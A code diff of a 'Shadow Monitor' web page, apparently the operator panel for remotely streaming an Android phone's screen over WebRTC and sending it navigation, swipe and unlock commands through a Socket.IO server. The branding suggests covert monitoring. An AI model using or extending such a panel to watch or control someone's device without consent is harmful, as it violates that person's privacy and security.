@@ -2,153 +2,267 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Shadow Monitor (Final Stable)</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shadow Monitor - Mobile View</title>
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.4/socket.io.js"></script>
 
     <style>
-        :root { --bg: #050505; --glass: rgba(20, 25, 35, 0.9); --cyan: #00f3ff; --red: #ff2a6d; }
-        body { margin: 0; background: var(--bg); color: #e0e6ed; font-family: 'Rajdhani', sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
-        
-        .top-bar { height: 50px; background: rgba(0,0,0,0.8); border-bottom: 1px solid #333; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; z-index: 10; }
-        .brand { color: var(--cyan); font-weight: bold; font-size: 1.2rem; }
-        .status { font-size: 0.9rem; color: #888; }
-        .status.live { color: #00ff88; font-weight: bold; }
+        :root {
+            --phone-bg: #000;
+            --bezel: #1a1a1a;
+            --accent: #00f3ff;
+            --glass: rgba(255, 255, 255, 0.1);
+        }
 
-        .main-area { flex: 1; position: relative; display: flex; justify-content: center; align-items: center; background: black; }
-        video { width: 100%; height: 100%; object-fit: contain; }
+        body {
+            background: #121212;
+            background-image: radial-gradient(#2a2a2a 1px, transparent 1px);
+            background-size: 20px 20px;
+            color: white;
+            font-family: 'Poppins', sans-serif;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        /* --- PHONE CHASSIS (THE FRAME) --- */
+        .phone-frame {
+            width: 320px;
+            height: 680px;
+            background: var(--phone-bg);
+            border: 12px solid var(--bezel);
+            border-radius: 40px;
+            position: relative;
+            box-shadow: 0 0 0 2px #333, 0 20px 50px rgba(0,0,0,0.7);
+            overflow: hidden;
+            transition: transform 0.3s;
+        }
+
+        /* Camera Notch */
+        .notch {
+            position: absolute;
+            top: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80px;
+            height: 20px;
+            background: var(--bezel);
+            border-bottom-left-radius: 12px;
+            border-bottom-right-radius: 12px;
+            z-index: 100;
+        }
+
+        /* --- SCREEN AREA --- */
+        .screen {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            background: #050505;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Video Stream */
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: fill; /* Stretch to fill phone screen */
+            background: black;
+        }
+
+        /* --- OVERLAY (Login Screen) --- */
+        .overlay {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.9);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 50;
+            backdrop-filter: blur(5px);
+        }
+
+        .overlay h2 { margin: 0 0 20px 0; color: var(--accent); letter-spacing: 2px; }
         
-        .overlay { position: absolute; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.8); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 5; }
-        .input-group { display: flex; gap: 10px; margin-top: 20px; }
-        input { padding: 10px; border-radius: 5px; border: 1px solid #444; background: #222; color: white; text-align: center; }
-        button.start-btn { padding: 10px 20px; background: var(--cyan); border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
+        input {
+            background: #222; border: 1px solid #444; color: white;
+            padding: 12px; border-radius: 8px; width: 70%;
+            text-align: center; font-size: 16px; margin-bottom: 15px;
+            outline: none;
+        }
         
-        .sidebar { height: 220px; background: var(--glass); border-top: 1px solid #333; padding: 10px; display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; z-index: 10; overflow-y: auto; }
-        .btn { background: rgba(255,255,255,0.05); border: 1px solid #333; color: #ccc; border-radius: 5px; cursor: pointer; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 10px; }
-        .btn:active { background: var(--cyan); color: black; }
-        .btn i { margin-bottom: 5px; font-size: 1.2rem; }
+        button.connect-btn {
+            background: var(--accent); color: black; border: none;
+            padding: 12px 30px; border-radius: 30px; font-weight: bold;
+            cursor: pointer; transition: 0.2s;
+            box-shadow: 0 0 15px rgba(0, 243, 255, 0.4);
+        }
+        button.connect-btn:hover { transform: scale(1.05); }
+
+        /* --- ANDROID NAVIGATION BAR (Overlay) --- */
+        .nav-bar {
+            position: absolute;
+            bottom: 10px;
+            left: 0;
+            width: 100%;
+            height: 50px;
+            display: flex;
+            justify-content: space-evenly;
+            align-items: center;
+            background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
+            z-index: 20;
+        }
+
+        .nav-btn {
+            color: rgba(255,255,255,0.7);
+            font-size: 1.2rem;
+            cursor: pointer;
+            padding: 10px;
+            transition: 0.2s;
+        }
+        .nav-btn:active { color: white; transform: scale(0.9); }
+
+        /* --- EXTERNAL CONTROLS (Below Phone) --- */
+        .external-controls {
+            margin-top: 20px;
+            display: flex;
+            gap: 15px;
+        }
+
+        .tool-btn {
+            background: #222;
+            border: 1px solid #444;
+            color: #ccc;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 1.2rem;
+            transition: 0.2s;
+        }
+        .tool-btn:hover { background: #333; color: var(--accent); }
+        .tool-btn:active { transform: scale(0.9); }
+
+        .status-badge {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+        .status-badge.live { color: #00ff88; text-shadow: 0 0 10px #00ff88; }
+
     </style>
 </head>
 <body>
 
-    <div class="top-bar">
-        <div class="brand"><i class="fa-solid fa-ghost"></i> SHADOW v5</div>
-        <div class="status" id="statusText">Disconnected</div>
-    </div>
+    <div class="status-badge" id="statusText">Disconnected</div>
 
-    <div class="main-area">
-        <div class="overlay" id="connectOverlay">
-            <h2 style="color: var(--cyan);">SECURE CONNECTION</h2>
-            <div class="input-group">
-                <input type="text" id="deviceId" placeholder="Device ID" value="945428">
-                <button class="start-btn" onclick="startViewing()">CONNECT NOW</button>
-            </div>
-            <p style="color: #666; font-size: 12px; margin-top: 10px;">Ensure App is Open & "Start" is clicked</p>
-        </div>
-
-        <video id="remoteVideo" autoplay playsinline muted controls></video>
-    </div>
-
-    <div class="sidebar">
-        <button class="btn" onclick="sendCmd('back')"><i class="fa-solid fa-chevron-left"></i> BACK</button>
-        <button class="btn" onclick="sendCmd('home')"><i class="fa-regular fa-circle"></i> HOME</button>
-        <button class="btn" onclick="sendCmd('recent')"><i class="fa-regular fa-square"></i> APPS</button>
+    <div class="phone-frame">
+        <div class="notch"></div>
         
-        <button class="btn" onclick="sendCmd('swipe_up')"><i class="fa-solid fa-arrow-up"></i> UP</button>
-        <button class="btn" onclick="sendCmd('swipe_down')"><i class="fa-solid fa-arrow-down"></i> DOWN</button>
-        <button class="btn" onclick="sendCmd('unlock')"><i class="fa-solid fa-lock-open"></i> WAKE</button>
+        <div class="screen">
+            <div class="overlay" id="connectOverlay">
+                <i class="fa-solid fa-mobile-screen" style="font-size: 40px; margin-bottom: 20px; color: #444;"></i>
+                <h2>SHADOW</h2>
+                <input type="text" id="deviceId" placeholder="Enter Device ID" value="945428">
+                <button class="connect-btn" onclick="startViewing()">CONNECT</button>
+            </div>
+
+            <video id="remoteVideo" autoplay playsinline muted></video>
+
+            <div class="nav-bar">
+                <i class="fa-solid fa-chevron-left nav-btn" onclick="sendCmd('back')"></i> <i class="fa-regular fa-circle nav-btn" onclick="sendCmd('home')" style="font-size: 1rem;"></i> <i class="fa-regular fa-square nav-btn" onclick="sendCmd('recent')" style="font-size: 1rem;"></i> </div>
+        </div>
+    </div>
+
+    <div class="external-controls">
+        <div class="tool-btn" onclick="sendCmd('swipe_up')" title="Swipe Up"><i class="fa-solid fa-arrow-up"></i></div>
+        <div class="tool-btn" onclick="sendCmd('swipe_down')" title="Swipe Down"><i class="fa-solid fa-arrow-down"></i></div>
+        <div class="tool-btn" onclick="sendCmd('unlock')" title="Unlock/Wake"><i class="fa-solid fa-power-off"></i></div>
     </div>
 
     <script>
-        // --- LOGIC FROM YOUR WORKING SIMPLE CODE ---
         const SOCKET_URL = "https://child-v9no.onrender.com"; 
         
         let socket;
         let peerConnection;
         const config = { iceServers: [{ urls: "stun:stun.l.google.com:19302" }] };
 
-        // UI Elements
         const statusEl = document.getElementById("statusText");
         const overlayEl = document.getElementById("connectOverlay");
         const videoEl = document.getElementById("remoteVideo");
 
-        // URL se ID uthao agar hai
+        // Auto-fill ID from URL if present (?id=123456)
         const urlParams = new URLSearchParams(window.location.search);
-        const urlId = urlParams.get('id');
-        if(urlId) document.getElementById("deviceId").value = urlId;
+        if(urlParams.get('id')) document.getElementById("deviceId").value = urlParams.get('id');
 
         function startViewing() {
             const deviceId = document.getElementById("deviceId").value;
-            if(!deviceId) return alert("Enter Device ID");
+            if(!deviceId) return alert("Please enter Device ID");
 
-            statusEl.innerText = "Connecting to Server...";
+            statusEl.innerText = "Connecting...";
             
-            // 1. Socket Connect (Wahi Logic)
-            if(socket) socket.disconnect(); // Purana clear karo
+            if(socket) socket.disconnect();
             socket = io(SOCKET_URL, { transports: ['websocket', 'polling'] });
 
             socket.on("connect", () => {
-                console.log("✅ Connected to Server");
-                statusEl.innerText = "Waiting for Android...";
+                console.log("✅ Socket Connected");
+                statusEl.innerText = "Waiting for Device...";
                 socket.emit("join-room", deviceId);
-                // Hide overlay immediately to show video is readying
-                overlayEl.style.display = "none";
+                overlayEl.style.display = "none"; // Hide Login Screen
             });
 
-            // 2. Wait for Offer (Updated Logic with fixes)
             socket.on("offer", async (data) => {
-                console.log("📡 Offer Received!");
-                statusEl.innerText = "Negotiating Stream...";
-                statusEl.className = "status live";
+                console.log("📡 Offer Received");
+                statusEl.innerText = "Receiving Stream...";
+                statusEl.className = "status-badge live";
 
                 if (peerConnection) peerConnection.close();
                 createPeerConnection(deviceId);
 
                 try {
-                    // --- YE HAI WO LINE JO CODE KO FIX KAREGI ---
-                    // Android kabhi kabhi string bhejta hai, kabhi JSON. Ye dono handle karega.
+                    // Handle JSON/String parsing safely
                     let offerDesc = data.offer;
-                    if (offerDesc.sdp) {
-                         // Already object, do nothing specific
-                    } else if (typeof offerDesc === 'string') {
-                        offerDesc = JSON.parse(offerDesc);
-                    }
+                    if (typeof offerDesc === 'string') offerDesc = JSON.parse(offerDesc);
                     
                     await peerConnection.setRemoteDescription(new RTCSessionDescription(offerDesc));
                     const answer = await peerConnection.createAnswer();
                     await peerConnection.setLocalDescription(answer);
 
-                    console.log("⚡ Sending Answer");
                     socket.emit("answer", { target: deviceId, answer: answer });
-                    
                 } catch (err) {
-                    console.error("Error handling offer:", err);
-                    statusEl.innerText = "Handshake Error";
+                    console.error("Handshake Error:", err);
                 }
             });
 
-            // 3. Candidate Logic (With Nesting Fix)
             socket.on("candidate", async (data) => {
                 if (peerConnection) {
                     try {
                         let candidateData = data.candidate;
-                        // --- YE NESTING FIX HAI ---
                         if (candidateData && candidateData.candidate && typeof candidateData.candidate === 'object') {
                             candidateData = candidateData.candidate;
                         }
                         await peerConnection.addIceCandidate(new RTCIceCandidate(candidateData));
-                        console.log("❄️ ICE Added");
-                    } catch (e) { console.error("Error adding candidate", e); }
+                    } catch (e) {}
                 }
             });
 
             socket.on("disconnect", () => {
                 statusEl.innerText = "Disconnected";
-                statusEl.className = "status";
-                overlayEl.style.display = "flex"; // Show input again
+                statusEl.className = "status-badge";
+                overlayEl.style.display = "flex"; // Show Login Screen again
             });
         }
 
@@ -156,10 +270,8 @@
             peerConnection = new RTCPeerConnection(config);
 
             peerConnection.ontrack = (event) => {
-                console.log("🎥 Video Stream Received!");
-                statusEl.innerText = "🔴 LIVE STREAMING";
+                console.log("🎥 Stream Started");
                 videoEl.srcObject = event.streams[0];
-                videoEl.play().catch(e => console.log("Press play button"));
             };
 
             peerConnection.onicecandidate = (event) => {
@@ -169,13 +281,13 @@
             };
         }
 
-        // Button Controls
         function sendCmd(action) {
             const deviceId = document.getElementById("deviceId").value;
             if(socket && socket.connected) {
+                // Button animation
                 socket.emit("control-event", { room: deviceId, action: action });
             } else {
-                alert("Connect first!");
+                alert("Please connect first!");
             }
         }
     </script>
